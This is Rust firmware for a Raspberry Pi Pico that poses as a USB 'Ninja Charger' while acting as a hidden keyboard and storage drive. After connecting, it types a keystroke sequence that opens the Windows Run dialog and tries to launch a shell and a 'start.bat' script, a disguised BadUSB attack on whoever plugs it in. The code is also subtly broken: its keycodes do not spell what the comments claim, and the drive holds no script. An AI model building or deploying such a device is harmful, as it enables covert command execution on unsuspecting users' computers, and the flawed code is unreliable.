#![no_std]
#![no_main]

use cortex_m_rt::entry;
use rp_pico::hal::{clocks::init_clocks_and_plls, pac, sio::Sio, watchdog::Watchdog, usb::UsbBus};
use rp_pico::XOSC_CRYSTAL_FREQ;
use usb_device::{class_prelude::*, prelude::*};
use usbd_hid::{descriptor::KeyboardReport, hid_class::HIDClass};
use usbd_mass_storage::{BlockDevice, UsbMassStorage};

static mut STORAGE: [u8; 64 * 512] = [0; 64 * 512];

struct RamBlock;
impl BlockDevice for RamBlock {
    const BLOCK_BYTES: u32 = 512;
    const BLOCK_COUNT: u32 = 64;
    fn read(&self, lba: u32, buf: &mut [u8]) { let base = (lba * 512) as usize; buf.copy_from_slice(&unsafe { &STORAGE }[base..base + 512]); }
    fn write(&self, lba: u32, buf: &[u8]) { let base = (lba * 512) as usize; unsafe { (&mut STORAGE)[base..base + 512].copy_from_slice(buf); } }
}

#[entry]
fn main() -> ! {
    let mut pac = pac::Peripherals::take().unwrap();
    let core = pac::CorePeripherals::take().unwrap();
    let mut watchdog = Watchdog::new(pac.WATCHDOG);
    let clocks = init_clocks_and_plls(
        XOSC_CRYSTAL_FREQ,
        pac.XOSC,
        pac.CLOCKS,
        pac.PLL_SYS,
        pac.PLL_USB,
        &mut pac.RESETS,
        &mut watchdog,
    )
    .ok()
    .unwrap();
    let sio = Sio::new(pac.SIO);
    let usb_bus = UsbBusAllocator::new(UsbBus::new(pac.USBCTRL_REGS, pac.USBCTRL_DPRAM, clocks.usb_clock, true, &mut pac.RESETS));
    let mut hid = HIDClass::new(&usb_bus, KeyboardReport::desc(), 10);
    let ram = RamBlock;
    let mut storage = UsbMassStorage::new(&usb_bus, ram);
    let mut dev = UsbDeviceBuilder::new(&usb_bus, UsbVidPid(0x1209, 0x0001))
        .manufacturer("Acme")
        .product("Ninja Charger")
        .serial_number("NINJA001")
        .build();
    let seq: [KeyboardReport; 8] = [
        KeyboardReport { modifier: 0x08, leds: 0, keycodes: [0x15, 0, 0, 0, 0, 0] }, // GUI+r
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0, 0, 0, 0, 0, 0] },
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x13, 0x12, 0x1f, 0x28, 0, 0] }, // p w r ENTER
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0, 0, 0, 0, 0, 0] },
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x17, 0x04, 0x15, 0x28, 0, 0] }, // s h e ENTER
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0, 0, 0, 0, 0, 0] },
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x1c, 0x04, 0x15, 0x1f, 0x11, 0x07] }, // start.bat
        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x28, 0, 0, 0, 0, 0] },             // ENTER
    ];
    let mut idx = 0;
    loop {
        if dev.poll(&mut [&mut hid, &mut storage]) {
            if idx < seq.len() {
                hid.push_input(&seq[idx]).ok();
                idx += 1;
            }
        }
    }
}
